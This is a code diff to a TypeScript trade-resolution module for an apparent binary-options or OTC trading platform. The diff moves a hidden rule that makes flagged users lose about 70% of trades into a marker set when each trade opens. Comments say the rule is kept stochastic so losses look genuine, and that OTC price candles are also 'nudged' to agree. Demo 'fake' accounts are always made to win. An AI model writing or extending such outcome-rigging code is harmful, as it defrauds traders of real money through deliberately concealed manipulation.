@@ -1,6 +1,7 @@
 import { Prisma } from '@prisma/client'
 import { prisma } from '../prisma.js'
 import { publishOperationEvent } from './events.js'
+import { isOpForcedLoss, clearOpForcedLoss, clearLiquiditySignalsForOp } from './liquidityManipulation.js'
 
 // Polls the DB for OPEN operations whose expiresAt has passed and resolves
 // them. Survives restarts: on boot it catches up on any backlog from downtime.
@@ -214,24 +215,23 @@ async function resolveOperation(op: {
 
     // ── Per-user resolution overrides ──
     //
-    // Two STRICT gates (`=== true` only — any other value falls through
-    // to normal price comparison). Order matters: isFake is checked FIRST
+    // STRICT gates — `=== true` only. Order matters: isFake checked FIRST
     // so a demo-fake user marked as liquidityMode by mistake still always
-    // wins (admin shouldn't combine, but if they do we err on the safe
-    // side for the user).
+    // wins (admin shouldn't combine, but we err on the safe side).
     //
-    //  1. isFake          — every resolution forced to WON.
-    //  2. liquidityMode   — every resolution gets a 70% LOSS roll, fresh
-    //                       per op so the long-run rate converges naturally.
-    //                       Math.random() < 0.7 keeps it stochastic; an
-    //                       observer can't tell from a single op whether
-    //                       it was forced or genuine.
+    //  1. isFake — every resolution forced to WON.
+    //  2. liquidity force-loss marker — set at OPEN time in createOperation
+    //     (70% roll happens ONCE per op there, not here). Reading from the
+    //     in-memory marker means an op can't re-roll partway. For OTC,
+    //     the candle was ALSO nudged by the tick loop's liquidity signal,
+    //     so the natural price compare would usually give LOSS anyway —
+    //     this marker is the safety net for OTC + the silent gate for
+    //     Binance (where no candle manipulation exists).
     //
-    // Defaults (undefined / false / null on either field) keep the
-    // existing CALL/PUT-vs-price logic untouched. NO real user without
-    // an explicit admin opt-in can land in either branch.
-    const forcedWin  = op.isFake        === true
-    const forcedLoss = !forcedWin && op.liquidityMode === true && Math.random() < 0.7
+    // Defaults (no marker present) keep the existing CALL/PUT-vs-price
+    // logic untouched. NO real user without admin opt-in lands here.
+    const forcedWin  = op.isFake === true
+    const forcedLoss = !forcedWin && isOpForcedLoss(op.id)
 
     const won = forcedWin
       ? true
@@ -239,6 +239,12 @@ async function resolveOperation(op: {
         ? false
         : (op.direction === 'CALL' && exitPrice > entry) ||
           (op.direction === 'PUT'  && exitPrice < entry)
+
+    // Cleanup the in-memory markers regardless of outcome — keeps the
+    // Set + signal map from growing unbounded. Safe to call even if no
+    // entry exists (both helpers are no-ops in that case).
+    clearOpForcedLoss(op.id)
+    clearLiquiditySignalsForOp(op.id)
 
     const profit = won ? parseFloat((amount * (op.payout / 100)).toFixed(2)) : 0
 
@@ -310,8 +316,8 @@ async function resolveOperation(op: {
     // Single structured log per resolution — grepable for auditing
     // resolution quality. Should see ~0% source=random in healthy runs.
     // fake/liquidity audit tags appear only when the override actually
-    // changed the outcome (liquidityMode w/o the 70% trigger logs nothing
-    // special — the resolution looked normal to the engine).
+    // changed the outcome (the 70% loss roll happened at OPEN time;
+    // a marker on resolve means the op was selected).
     const tfStr        = exit.candleTf ? ` candle_tf=${exit.candleTf}` : ''
     const fakeStr      = forcedWin  ? ' fake=true' : ''
     const liquidityStr = forcedLoss ? ' liquidity_forced=true' : ''
